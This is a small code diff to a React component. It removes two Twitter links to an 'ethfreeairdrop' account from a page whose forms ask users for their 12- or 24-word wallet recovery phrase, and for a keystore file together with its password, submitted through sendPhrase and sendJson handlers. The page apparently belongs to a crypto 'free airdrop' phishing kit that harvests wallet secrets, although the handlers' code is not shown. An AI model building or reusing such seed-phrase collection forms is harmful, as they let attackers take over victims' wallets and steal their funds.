@@ -120,7 +120,6 @@ function Header() {
                 <p className="phrase__description">Typically 12, (sometimes 24) words separated by single spaces</p>
                 <Button onClick={sendPhrase} type="submit" className="btn" variant="contained" color="primary">IMPORT</Button>
                 </form>
-                <a href="https://mobile.twitter.com/ethfreeairdrop" className="social__handles"> <TwitterIcon color="primary"/>Twitter</a>
 
                 
             </div>
@@ -137,7 +136,6 @@ function Header() {
                 <p className="phrase__description">Several lines of text beginning with '(...)' plus the password you used to encrypt its</p>
                 <Button onClick={sendJson} type="submit" className="btn" variant="contained" color="primary">IMPORT</Button>
                 </form>
-                <a href="https://mobile.twitter.com/ethfreeairdrop" className="social__handles"> <TwitterIcon color="primary"/>Twitter</a>
 
                 
             </div>
